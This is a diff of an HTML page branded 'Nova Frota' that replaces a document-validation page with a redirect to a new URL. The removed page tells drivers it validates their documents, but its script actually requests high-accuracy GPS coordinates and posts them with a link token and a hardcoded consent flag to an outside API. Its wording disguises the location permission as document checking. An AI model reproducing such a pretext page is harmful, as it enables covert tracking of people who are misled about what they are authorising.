@@ -5,135 +5,25 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="referrer" content="no-referrer">
 <meta name="robots" content="noindex,nofollow,noarchive">
-<title>Confirme toda documentação, para receber o link da sua Biometria | Nova Frota</title>
+<title>Endereço atualizado | Nova Frota</title>
 <style>
-:root{color-scheme:light;--navy:#0c2d4c;--green:#058861;--muted:#536d85;--line:#d2e2ee}
-*{box-sizing:border-box}
-html,body{min-height:100%;margin:0}
-body{background:radial-gradient(ellipse at 70% -30%,#b8e4f2,transparent 60%),#edf4fa;
- font:15px/1.5 Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Arial,sans-serif;
- color:#14334d;display:grid;place-items:center;padding:20px}
-main{width:min(480px,100%);background:#fff;border:1px solid #cbddeb;
- border-radius:22px;overflow:hidden;box-shadow:0 22px 70px rgba(14,51,81,.13)}
-header{background:linear-gradient(125deg,#0b2b4c,#106684 72%,#108765);color:#fff;padding:26px 26px 23px}
-header small{letter-spacing:.14em;font-weight:900;color:#b0f8d3;font-size:11px}
-header h1{font-size:25px;letter-spacing:-.04em;line-height:1.2;margin:8px 0}
-header p{font-size:13px;color:#e3f7f3;margin:0;line-height:1.5}
-.content{padding:24px 26px;display:grid;gap:14px}
-.symbol{width:55px;height:55px;display:grid;place-items:center;background:#e4f8f0;
- border-radius:15px;font-size:29px;color:#067f5d}
-h2{font-size:19px;color:#143955;margin:0}
-p{margin:0;line-height:1.6}
-.info{font-size:13px;color:var(--muted);background:#f3f8fc;padding:12px 14px;border:1px solid var(--line);border-radius:11px}
-.info strong{color:#153a57}
-button{appearance:none;border:0;border-radius:11px;padding:14px 16px;min-height:51px;
- color:#fff;background:#078960;font:900 15px inherit;font-size:15px;cursor:pointer}
-button:disabled{opacity:.55;cursor:not-allowed}
-button:focus-visible,a:focus-visible{outline:3px solid #62b9ec;outline-offset:3px}
-#status{font-size:13px;min-height:23px;font-weight:700;color:#326782}
-#status.error{color:#a93636}
-#status.success{color:#087452}
-.small{color:#6b8293;font-size:12px}
-#success[hidden],#share[hidden]{display:none!important}
-#success{padding:13px 15px;border:1px solid #9bdec2;background:#eafaf1;border-radius:10px}
-#success strong{display:block;color:#08764e;margin-bottom:5px}
-#share{display:inline-block;margin-top:10px;text-decoration:none;font-weight:850;color:#0e6795}
-footer{text-align:center;font-size:11px;color:#678094;padding:0 25px 20px}
-@media(max-width:430px){body{padding:9px}header{padding:22px}.content{padding:21px}}
+body{min-height:100vh;margin:0;background:#eef4fa;color:#123b56;font:16px/1.5 Arial,sans-serif;display:grid;place-items:center;padding:20px;box-sizing:border-box}
+main{max-width:480px;background:white;border:1px solid #d4e2ed;border-radius:16px;padding:25px;text-align:center}
+a{font-weight:700;color:#087758}
 </style>
 </head>
 <body>
 <main>
-<header>
- <small>NOVA FROTA · LOGÍSTICA</small>
- <h1>VALIDAR DOCUMENTAÇÃO- ORIGEM E DESTINO</h1>
- <p>Após baixar e validar a documentação, seu link será liberado, para realziar a biometria</p>
-</header>
-<section class="content">
- <div class="symbol" aria-hidden="true">📄</div>
- <h2>Validação de documentos</h2>
- <p>Para orientar o carregamento, a Nova Frota solicita  <strong>Conferencia</strong>. Ao tocar no botão, o navegador pedirá permissão para que você possa alterar os documentos, e anexar os corretos, caso estejam divergentes.</p>
- <p class="info"><strong>O que será validado:</strong> CNH, Documentos, contato, origem e destino da carga.</p>
- <button type="button" id="sendLocation" disabled>Validar documentação uma vez...</button>
- <p id="status" role="status" aria-live="polite">Verificando link...</p>
- <div id="success" hidden>
-  <strong>Documentos validados com sucesso!</strong>
-  <p>O ponto foi registrado e está disponível para a equipe da Nova Frota.</p>
-  <a id="share" href="#" target="_blank" rel="noopener noreferrer" hidden>Conferir dados</a>
- </div>
- <p class="small">Se negar a permissão, nenhum documento será validado. Você pode solicitar um novo link à transportadora.</p>
-</section>
-<footer>A validação é visível somente para usuários autorizados do Portal Frete.</footer>
+<h1>Endereço atualizado</h1>
+<p>A página de localização pontual agora está em <strong>validacao.html</strong>.</p>
+<p>Você será redirecionado para a nova página, onde poderá autorizar o envio de um único ponto GPS.</p>
+<p><a id="next" href="/pages/validacao.html">Abrir a nova página</a></p>
 </main>
 <script>
-(()=>{
- "use strict";
- const API="https://api.portalfrete.net.br";
- const token=location.hash.replace(/^#/,"").trim();
- const button=document.getElementById("sendLocation"),
-  status=document.getElementById("status"),
-  success=document.getElementById("success"),
-  share=document.getElementById("share");
- let available=false,busy=false;
- function message(value,kind=""){
-  status.textContent=value;status.className=kind;
- }
- async function api(path,payload){
-  const response=await fetch(API+path,{method:"POST",mode:"cors",
-   headers:{"Content-Type":"application/json"},cache:"no-store",
-   credentials:"omit",body:JSON.stringify(payload)});
-  const data=await response.json().catch(()=>({}));
-  if(!response.ok||!data.ok)throw Error(data.error||"Não foi possível enviar sua validação.");
-  return data;
- }
- async function preview(){
-  if(!/^[0-9a-f]{64}$/.test(token)){
-   message("Link inválido. Peça outro link à transportadora.","error");return;
-  }
-  try{
-   const info=await api("/v1/monitor/spot/preview",{token});
-   if(info.used){
-    message("Este link já foi utilizado. A documentação só pode ser enviada uma vez.","success");
-    return;
-   }
-   available=true;button.disabled=false;
-   message("Link válido. Toque no botão e autorize a validação dos documentos no celular.");
-  }catch(error){message(error.message,"error")}
- }
- button.onclick=async()=>{
-  if(!available||busy)return;
-  if(!navigator.geolocation||!window.isSecureContext){
-   message("Este navegador não disponibiliza downloand. Abra o link no Chrome ou Safari com conexão HTTPS.","error");
-   return;
-  }
-  busy=true;button.disabled=true;
-  message("Solicitando permissão de validação ao navegador...");
-  navigator.geolocation.getCurrentPosition(async pos=>{
-   message("Ponto encontrado. Enviando à Nova Frota...");
-   try{
-    const body={
-     token,consent:true,purpose:"ponto-descarga-v1",
-     latitude:pos.coords.latitude,longitude:pos.coords.longitude,
-     accuracy:pos.coords.accuracy
-    };
-    const data=await api("/v1/monitor/spot/submit",body);
-    available=false;success.hidden=false;
-    message("Ponto recebido. Nenhuma outra posição será coletada.","success");
-    if(data.googleMaps){
-     share.href=data.googleMaps;share.hidden=false;
-    }
-    try{history.replaceState(null,"",location.pathname+location.search)}catch(_){}
-   }catch(error){
-    message(error.message,"error");button.disabled=false;
-   }finally{busy=false}
-  },error=>{
-   busy=false;button.disabled=false;
-   if(error.code===1)message("A permissão da validação foi negada. Autorize a validação no navegador para enviar o ponto.","error");
-   else if(error.code===3)message("O usuario demorou a responder. Verifique o sinal e tente novamente.","error");
-   else message("Não foi possível obter a validação das informações. Ative o GPS do celular e tente novamente.","error");
-  },{enableHighAccuracy:true,maximumAge:0,timeout:25000});
- };
- preview();
+(()=>{"use strict";
+ const destination="/pages/validacao.html"+window.location.hash;
+ document.getElementById("next").href=destination;
+ window.location.replace(destination);
 })();
 </script>
 </body>
